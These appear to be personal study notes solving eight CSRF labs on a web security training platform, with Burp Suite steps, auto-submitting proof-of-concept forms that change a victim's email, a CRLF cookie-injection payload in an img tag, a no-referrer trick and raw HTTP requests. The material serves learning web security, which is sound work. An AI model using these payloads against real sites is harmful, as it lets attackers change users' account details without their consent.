1. CSRF vulnerability with no defenses

	csrf with no csrf token

2. CSRF where token validation depends on request method



With your browser proxying traffic through Burp Suite, log in to your account, submit the "Change email" form, and find the resulting request in your Proxy history.

Send the request to Burp Repeater and observe that if you change the value of the csrf parameter then the request is rejected.

Use "Change request method" on the context menu to convert it into a GET request and observe that the CSRF token is no longer verified.

If you're using Burp Suite Professional, right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".

If you're using Burp Suite Community Edition, use the following HTML template and fill in the request's method, URL, and body parameters. You can get the request URL by right-clicking and selecting "Copy URL".

<form method="$method" action="$url">
     <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
      document.forms[0].submit();
</script>

Go to the exploit server, paste your exploit HTML into the "Body text" box, and click "Store".

To verify if the exploit will work, try it on yourself by clicking "View exploit" and checking the resulting HTTP request and response.


3. CSRF where token validation depends on token being present

	

With your browser proxying traffic through Burp Suite, log in to your account, submit the "Change email" form, and find the resulting request in your Proxy history.

Send the request to Burp Repeater and observe that if you change the value of the csrf parameter then the request is rejected.

Delete the csrf parameter entirely and observe that the request is now accepted.

If you're using Burp Suite Professional, right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".

If you're using Burp Suite Community Edition, use the following HTML template and fill in the request's method, URL, and body parameters. You can get the request URL by right-clicking and selecting "Copy URL".

<form method="$method" action="$url">
     <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
      document.forms[0].submit();
</script>

Go to the exploit server, paste your exploit HTML into the "Body text" box, and click "Store".

To verify if the exploit will work, try it on yourself by clicking "View exploit" and checking the resulting HTTP request and response.

	
4. CSRF where token is not tied to user session

	

With your browser proxying traffic through Burp Suite, log in to your account, submit the "Change email" form, and intercept the resulting request.

Make a note of the value of the CSRF token, then drop the request.

Open a private/incognito browser window, log in to your other account, and send the change email request into Burp Repeater.

Observe that if you swap the CSRF token with the value from the other account, then the request is accepted.

Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses. Note that the CSRF tokens are single-use, so you'll need to include a fresh one.


5. CSRF where token is tied to non-session cookie

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac2c1f461f28a20e80d50fd1008500a4.web-security-academy.net/email/change-email" method="POST">
      <input type="hidden" name="email" value="a&#64;kcom" />
      <input type="hidden" name="csrf" value="UBUVtIXYW0UrdYH0iax2CTrQ7HE4cIzp" />
      <input type="submit" value="Submit request" />
    </form>
	 <img src="https://ac2c1f461f28a20e80d50fd1008500a4.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=JMZbEEhQbNIc3hqAjyn2Y3atpzESGXU2" onerror="document.forms[0].submit()"> 
  </body>
</html>

<img src="https://ac2c1f461f28a20e80d50fd1008500a4.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=JMZbEEhQbNIc3hqAjyn2Y3atpzESGXU2" onerror="document.forms[0].submit()">


6. CSRF where token is duplicated in cookie

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac2c1f461f28a20e80d50fd1008500a4.web-security-academy.net/email/change-email" method="POST">
      <input type="hidden" name="email" value="a&#64;kcom" />
      <input type="hidden" name="csrf" value="csrf" />
      <input type="submit" value="Submit request" />
    </form>
	 <img src="https://ac2c1f461f28a20e80d50fd1008500a4.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=csrf" onerror="document.forms[0].submit()"> 
  </body>
</html>

<img src="https://ac2c1f461f28a20e80d50fd1008500a4.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=csrf" onerror="document.forms[0].submit()"> 

7. CSRF where Referer validation depends on header being present

	delele the header from http request then csrf poc

	<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
	<head> <meta name="referrer" content="no-referrer"> </head>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac1f1f3e1ec8aa4a808e7058003700da.web-security-academy.net/email/change-email" method="POST">
      <input type="hidden" name="email" value="a&#64;a&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

delete full referar header

POST /email/change-email HTTP/1.1
Host: ac1f1f3e1ec8aa4a808e7058003700da.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://ac1f1f3e1ec8aa4a808e7058003700da.web-security-academy.net
Connection: close
Cookie: session=tv991TkKhJQ4MDL3CN65wOUfdCZkGVVm
Upgrade-Insecure-Requests: 1

email=a%40a.com

8. CSRF with broken Referer validation

POST /email/change-email HTTP/1.1
Host: ac1f1f3e1ec8aa4a808e7058003700da.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://ac1f1f3e1ec8aa4a808e7058003700da.web-security-academy.net
Connection: close
Referer:
Cookie: session=tv991TkKhJQ4MDL3CN65wOUfdCZkGVVm
Upgrade-Insecure-Requests: 1

email=a%40a.com


keep the referar header blank


